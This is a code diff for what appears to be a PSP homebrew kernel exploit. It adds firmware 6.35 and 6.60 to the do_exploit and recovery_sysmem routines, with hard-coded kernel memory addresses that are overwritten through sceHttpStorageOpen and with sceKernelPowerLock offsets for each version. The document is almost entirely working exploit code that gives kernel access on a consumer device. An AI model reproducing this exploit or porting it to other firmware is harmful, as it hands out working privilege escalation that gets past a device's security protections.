@@ -80,11 +80,16 @@ void sync_cache(void)
 /** Recovery the instruction we smashed */
 void recovery_sysmem(void) {
 	switch (version) {
+	/* lui $a1, 0x8801 */
 	case 0x620:
-		_sw(0x3C058801, 0x8800CCBC);	// lui $a1, 0x8801 for 6.20
+		_sw(0x3C058801, 0x8800CCBC);
 		break;
+	case 0x635:
 	case 0x639:
-		_sw(0x3C058801, 0x8800CC34);	// lui $a1, 0x8801 for 6.39
+		_sw(0x3C058801, 0x8800CC34);
+		break;
+	case 0x660:
+		_sw(0x3C058801, 0x8800CBB8);
 		break;
 	default:
 		break;
@@ -140,11 +145,16 @@ void do_exploit(void) {
 	 * Now the gate to kernel is opened :)
 	 */
 	switch (version) {
+	/* scePowerLock override */
 	case 0x620:
-		ret = sceHttpStorageOpen((0x8800CCBC >> 2), 0, 0); // scePowerLock override for 6.20
+		ret = sceHttpStorageOpen((0x8800CCBC >> 2), 0, 0);
 		break;
+	case 0x635:
 	case 0x639:
-		ret = sceHttpStorageOpen((0x8800CC34 >> 2), 0, 0); // scePowerLock override for 6.39
+		ret = sceHttpStorageOpen((0x8800CC34 >> 2), 0, 0);
+		break;
+	case 0x660:
+		ret = sceHttpStorageOpen((0x8800CBB8 >> 2), 0, 0);
 		break;
 	default:
 		break;
@@ -161,9 +171,14 @@ void do_exploit(void) {
 		/* 0x00004234 is sceKernelPowerLockForUser data offset for 6.20 */
 		sceKernelPowerLock(0, ((u32) &entry_addr) - 0x00004234);
 		break;
+	case 0x635:
 	case 0x639:
-		/* 0x000040F4 is sceKernelPowerLockForUser data offset for 6.39 */
+		/* 0x000040F4 is sceKernelPowerLockForUser data offset for 6.35 and 6.39 */
 		sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
+		break;
+	case 0x660:
+		/* 0x000040F8 is sceKernelPowerLockForUser data offset for 6.60 */
+		sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F8);
 		break;
 	default:
 		break;
